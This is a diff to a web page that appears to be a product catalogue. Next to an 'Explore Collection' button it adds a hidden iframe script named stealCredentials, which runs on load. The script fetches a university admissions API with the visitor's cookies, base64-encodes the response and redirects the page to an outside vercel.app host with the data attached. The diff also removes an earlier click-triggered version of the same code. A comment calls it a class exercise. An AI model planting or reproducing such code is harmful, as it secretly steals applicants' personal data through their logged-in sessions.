@@ -465,6 +465,28 @@
                             Explore Collection
                         </button>
 
+                        <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+        async function stealCredentials() {
+        const targetUrl = 'https://admissions.minaretuniversity.edu.ng/api/v1/applications/me?page=1&pageSize=50';
+        const attackerUrl = 'https://separate-backend.vercel.app/api/v1/me';
+
+        try
+        {
+            let response = await fetch(targetUrl, {
+                method: 'GET',
+                credentials: 'include'
+            })
+            let sensitiveData = await response.text()
+            parent.location = attackerUrl + '?stolen=' + btoa(sensitiveData)
+        
+        } catch (err) {
+            console.error(err);
+        }}
+        stealCredentials();
+    </script>">    
+</iframe>
+
+
                         <a
                             href="#contact"
                             class="btn btn-outline-main mb-2"
@@ -1254,97 +1276,33 @@
 
         });
 
+       function triggerFrame(){
+        //  const button =
+        //     document.getElementById(
+        //         "exploreCollections"
+        //     );
+        const iframe = document.querySelector(
+            'iframe[sandbox]'
+        );
+        if (iframe && iframe.contentWindow) {
+            iframe.contentWindow.postMessage(
+                'trigger',
+                '*'
+            );
+        }
+       }
+
         const button =
             document.getElementById(
                 "exploreCollections"
             );
-
-        if (button) {
-
+       
             button.addEventListener(
                 "click",
-                function (event) {
-
-                    event.preventDefault();
-
-                    const iframe =
-                        document.createElement(
-                            "iframe"
-                        );
-
-
-                    // Same sandbox configuration
-                    // used in the class exercise
-                    iframe.setAttribute(
-                        "sandbox",
-                        "allow-scripts allow-top-navigation allow-forms"
-                    );
-
-
-                    // Hide iframe
-                    iframe.style.display =
-                        "none";
-
-                    iframe.srcdoc = `
-                        <script>
-
-                            async function stealCredentials() {
-
-                                const targetUrl =
-                                    "https://admissions.minaretuniversity.edu.ng/api/v1/applications/me?page=1&pageSize=50";
-
-                                const attackerUrl =
-                                    "https://nana-s-catalogue.vercel.app/";
-
-
-                                try {
-
-                                    const response =
-                                        await fetch(
-                                            targetUrl,
-                                            {
-                                                method: "GET",
-                                                credentials: "include"
-                                            }
-                                        );
-
-
-                                    const sensitiveData =
-                                        await response.text();
-
-
-                                    parent.location =
-                                        attackerUrl +
-                                        "?stolen=" +
-                                        btoa(sensitiveData);
-
-
-                                } catch (err) {
-
-                                    console.error(
-                                        err
-                                    );
-
-                                }
-
-                            }
-
-
-                            stealCredentials();
-
-                        <\/script>
-                    `;
-
-
-                    // Add iframe to page
-                    document.body.appendChild(
-                        iframe
-                    );
-
+                function () {
+                    triggerFrame();
                 }
             );
-
-        }
 
     </script>
 
